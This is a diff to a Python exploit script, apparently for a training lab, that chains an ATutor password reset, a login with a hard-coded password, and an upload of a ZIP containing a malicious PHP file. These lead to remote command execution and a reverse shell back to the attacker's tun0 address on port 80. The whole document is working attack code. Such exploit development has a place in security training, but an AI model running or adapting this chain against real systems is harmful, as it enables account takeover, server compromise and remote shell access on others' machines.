@@ -1,7 +1,10 @@
 import sys, re, os, html
 import requests
 from bs4 import BeautifulSoup
+
 import hashlib, string, itertools
+from io import BytesIO
+import zipfile
 
 ascii_list = list(range(48,57)) + list(range(97, 123)) + list(range(32,48)) + list(range(57,64)) + list(range(90,97)) + list(range(123,127)) + list(range(64,90))
 # List of characters in (rough) order of frequency
@@ -220,6 +223,7 @@ def get_email_code(session, ip):
     raise Exception("No valid password reset URL found!")
 
 def reset_password(ip, password_url):
+    print("Resetting Password.....")
     s = requests.Session()
 
     headers = {
@@ -260,6 +264,44 @@ def reset_password(ip, password_url):
 
     r = s.post(target, data=data)
 
+def login(ip, username):
+    target = f"http://{ip}/ATutor/login.php"
+    token = "token"
+    PASSWORD = 'Bromine1!'
+    password_hash = hashlib.sha1(PASSWORD.encode()).hexdigest()
+    hashed = hashlib.sha1((password_hash + token).encode('utf-8'))
+
+    print(f"Logging in as user {username} with password {PASSWORD}......")
+    data = {
+        "submit": "Login",
+        "form_login": username,
+        "form_password_hidden": hashed.hexdigest(),
+        "token":token
+    }
+
+    s = requests.Session()
+
+    headers = {
+        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0',
+        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8'
+    }
+
+    s.headers.update(headers)
+
+    # proxies = {
+    #     'http': 'http://127.0.0.1:8080'
+    # }
+    # s.proxies.update(proxies)
+
+    r = s.post(target, data=data)
+    res = r.text
+
+    if re.search("Invalid login/password combination.",res):
+        raise Exception("Invalid Login!")
+    print("Login Successful!")
+    return s
+
+
 def build_zip():
     f = BytesIO()
     z = zipfile.ZipFile(f, 'w', zipfile.ZIP_DEFLATED)
@@ -272,6 +314,7 @@ def build_zip():
     zip.close()
 
 def upload_zip(ip, session):
+    print("Uploading ZIP file with malicios PHP file......")
     build_zip()
 
     target = f"http://{ip}/ATutor/mods/_standard/tests/import_test.php"
@@ -299,6 +342,7 @@ def send_command(ip, session, command):
     return r.text
 
 def send_reverse_shell(ip, session):
+    print("Sending reverse shell... Ensure netcat listening on port 80")
     LHOST = os.popen('ip addr show tun0').read().split("inet ")[1].split("/")[0]
     LPORT = 80
 
@@ -348,9 +392,8 @@ def main():
 
     reset_password(ip, password_url)
 
-    print(f"Logging in as user {username}......")
-    session = login(ip, username, hash)
-    
+    session = login(ip, username)
+
     # Main page
     r = session.get(f"http://{ip}/ATutor/users/index.php")
     text = r.text
@@ -365,7 +408,6 @@ def main():
     r = session.get(f"http://{ip}/ATutor/{link[0]}")
 
     # Upload zip file with malicious PHP
-    print("Uploading ZIP file with malicios PHP file......")
     upload_zip(ip, session)
 
     # Send command to our uploaded reverse shell
@@ -375,7 +417,6 @@ def main():
         raise "Remote Code Execution Failure!"
     print("Remote Code Execution working!")
 
-    print("Sending reverse shell... Ensure netcat listening on port 80")
     resp = send_reverse_shell(ip, session)
 
 if __name__ == '__main__':
